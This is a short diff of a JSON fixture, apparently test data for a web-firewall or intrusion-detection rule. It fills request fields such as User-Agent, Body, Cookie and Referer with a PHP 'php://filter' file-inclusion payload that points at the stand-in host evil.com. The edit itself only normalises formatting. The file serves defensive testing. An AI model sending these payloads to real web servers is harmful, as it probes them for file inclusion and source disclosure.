@@ -5,10 +5,10 @@
         "UA": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
         "Body": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
         "ARGS": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
-        "Cookie" : "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
-        "URL": "null",
-        "Referer" : "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
-        "Headers": "null"
+        "Cookie": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
+        "URL": "",
+        "Referer": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
+        "Headers": ""
       }
     ]
   }
